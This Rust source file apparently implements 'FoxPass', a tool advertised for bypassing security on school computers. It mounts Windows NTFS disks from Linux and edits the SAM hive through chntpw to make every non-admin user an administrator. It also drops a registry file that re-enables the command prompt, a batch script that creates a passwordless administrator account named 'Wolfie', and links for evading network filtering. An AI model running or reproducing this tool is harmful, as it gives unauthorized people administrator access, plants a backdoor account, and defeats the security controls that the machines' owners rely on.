use terminal_menu::*;
use rand::Rng;
use std::{process::Command, vec};
use std::path::Path;
use std::thread::sleep;
use std::time::Duration;
use std::fs;
mod chntpw;

fn main() {
    use crossterm::style::Color;
    let menu2 = menu(vec![
        label(" █████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒█████ ").colorize(Color::Cyan),
        label(r#"
        ______        _____              
       |  ____|      |  __ \             
       | |__ _____  _| |__) |_ _ ___ ___ 
       |  __/ _ \ \/ /  ___/ _` / __/ __|
       | | | (_) >  <| |  | (_| \__ \__ \
       |_|  \___/_/\_\_|   \__,_|___/___/
           "#).colorize(Color::Green),
        label("=====================================================").colorize(Color::Cyan),
        label(" FoxPass V1, Simple Bypass ").colorize(Color::Yellow),
        label(" Script for school computers ").colorize(Color::White),
        label(" Security! made by @brewthefox ").colorize(Color::Magenta),
        label("=====================================================").colorize(Color::Cyan),
        button("Install Utils & Bypasses").colorize(Color::Blue),
        button("Quit").colorize(Color::Red)
    ]);
    
    let menu = menu(vec![
        label(" █████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒█████ ").colorize(Color::Cyan),
        label(r#"
        ______        _____              
       |  ____|      |  __ \             
       | |__ _____  _| |__) |_ _ ___ ___ 
       |  __/ _ \ \/ /  ___/ _` / __/ __|
       | | | (_) >  <| |  | (_| \__ \__ \
       |_|  \___/_/\_\_|   \__,_|___/___/
           "#).colorize(Color::Green),
        label("=====================================================").colorize(Color::Cyan),
        label(" FoxPass V1, Simple Bypass ").colorize(Color::Yellow),
        label(" Script for school computers ").colorize(Color::White),
        label(" Security! made by @brewthefox ").colorize(Color::Magenta),
        label("=====================================================").colorize(Color::Cyan),
        button("Start FoxPass").colorize(Color::Green),
        button("Quit").colorize(Color::Red)
    ]);
    run(&menu);
   if mut_menu(&menu).selected_item_name() == "Start FoxPass"{
    let mut rng = rand::thread_rng();
    let data: Result<std::process::Output, std::io::Error> = Command::new("lsblk").arg("-o").arg("NAME,FSTYPE").arg("-n").arg("-p").output();
    let mut data: String = match data {
        Ok(output) => String::from_utf8_lossy(&output.stdout).to_string(),
        Err(_) => "Not Found".to_string(),
    };
    data = data.replace("└", "");
    data = data.replace("├","");
    data = data.replace("─","");
    let alldisks = data.split("\n");
    let mut windowsdisks:Vec<String> = vec![];
    for disk in alldisks{
        if disk.contains("ntfs") {
            println!("[+] Disco ntfs encontrado: {}", disk);
            windowsdisks.insert(0, disk.replace(" ntfs", "").replace(" ", ""));
        }
    }
    for disk in windowsdisks {
        let diskname: String = ["/mnt/", &rng.gen_range(1000000000..2147483647).to_string(),].concat();
        _ = Command::new("mkdir").arg(&diskname).spawn().unwrap();
        _ = Command::new("mount").arg("-t").arg("ntfs-3g").arg(&disk).arg(&diskname).arg("-o").arg("remove_hiberfile").spawn().unwrap();
        sleep(Duration::from_millis(2000));
        if Path::new(&diskname).join("Windows").join("System32").join("config").join("SAM").exists() {
            let sampath: String = Path::new(&diskname).join("Windows").join("System32").join("config").join("SAM").into_os_string().into_string().unwrap();
            let nonadminusers: Vec<String> = chntpw::get_users(&sampath);
            for userid in &nonadminusers{
                chntpw::administrator_privileges(&userid, &sampath);
                println!("[+] Bypassed user {}", userid)
            }
            if nonadminusers.len() == 0 {
                println!("[-] En el disco no hay usuarios sin administrador")
            }
        }
        else {
            println!("No Existe SAM en {}", Path::new(&diskname).join("Windows/System32/config").to_string_lossy());
        }
        _ = Command::new("umount").arg(&diskname).spawn().unwrap();
        sleep(Duration::from_millis(2000));
        _ = Command::new("rmdir").arg(&diskname).spawn().unwrap();
        sleep(Duration::from_millis(1000));
    }
   }
   else {
       _ = Command::new("reboot").spawn().unwrap();
   }
   
    run(&menu2);
    if mut_menu(&menu2).selected_item_name() == "Install Utils & Bypasses"{
        let mut rng = rand::thread_rng();
        let data: Result<std::process::Output, std::io::Error> = Command::new("lsblk").arg("-o").arg("NAME,FSTYPE").arg("-n").arg("-p").output();
        let mut data: String = match data {
            Ok(output) => String::from_utf8_lossy(&output.stdout).to_string(),
            Err(_) => "Not Found".to_string(),
        };
        data = data.replace("└", "");
        data = data.replace("├","");
        data = data.replace("─","");
        let alldisks = data.split("\n");
        let mut windowsdisks:Vec<String> = vec![];
        for disk in alldisks{
            if disk.contains("ntfs") {
                println!("[+] Disco ntfs encontrado: {}", disk);
                windowsdisks.insert(0, disk.replace(" ntfs", "").replace(" ", ""));
            }
        }
        for disk in windowsdisks {
            let diskname: String = ["/mnt/", &rng.gen_range(1000000000..2147483647).to_string(),].concat();
            _ = Command::new("mkdir").arg(&diskname).spawn().unwrap();
            _ = Command::new("mount").arg("-t").arg("ntfs-3g").arg(&disk).arg(&diskname).arg("-o").arg("remove_hiberfile").spawn().unwrap();
            sleep(Duration::from_millis(2000));
            let desktop = Path::new(&diskname).join("Users").join("Public").join("Desktop");
            let desktop2 = desktop.clone();
            let desktop3 = desktop.clone();
            if desktop.exists(){
                _ =fs::write(desktop.join("bypass_politicas.reg"), "Windows Registry Editor Version 5.00\n[HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\System]\n\"DisableCMD\"=dword:00000000\n[HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\System]\"DisableCMD\"=dword:00000000").unwrap();
                println!("[+] Se escribio bypass de politicas en {}", desktop.into_os_string().into_string().unwrap());
                _ = fs::write(desktop2.join("(ADMINISTRADOR ES) Crear Usuario.bat"), r#"
                @echo off
                :: Crear el nuevo usuario "Wolfie"
                net user "Wolfie" /add
                :: Agregar el nuevo usuario al grupo de administradores
                net localgroup Administradores "Wolfie" /add
                :: Configurar el nuevo usuario para no requerir contraseña
                net user "Wolfie" * /expires:never /passwordchg:no /passwordreq:no
                :: Mostrar mensaje de éxito
                echo Usuario "Wolfie" creado con privilegios de administrador y sin contraseña.
                pause
                    "#).unwrap();
                println!("[+] Se escribio bypass de usuario en {}", desktop2.into_os_string().into_string().unwrap());
                _ = fs::write(desktop3.join("Extra.txt"), "LINKS IMPORTANTES PARA SALTARSE LA RED\nhttps://github.com/MatsuriDayo/nekoray\nhttps://github.com/Epodonios/v2ray-configs/tree/main").unwrap();
                println!("[+] Se escribio bypass de red en {}", desktop3.into_os_string().into_string().unwrap());
            }
            _ = Command::new("umount").arg(&diskname).spawn().unwrap();
            sleep(Duration::from_millis(2000));
            _ = Command::new("rmdir").arg(&diskname).spawn().unwrap();
            sleep(Duration::from_millis(1000));
            println!("[+] Bypasses Exitosos, Ahora eres Libre!!!");
            sleep(Duration::from_secs(2));
            _ = Command::new("reboot").spawn().unwrap()
        }  
    }
    else {
        _ = Command::new("reboot").spawn().unwrap();
    }
}
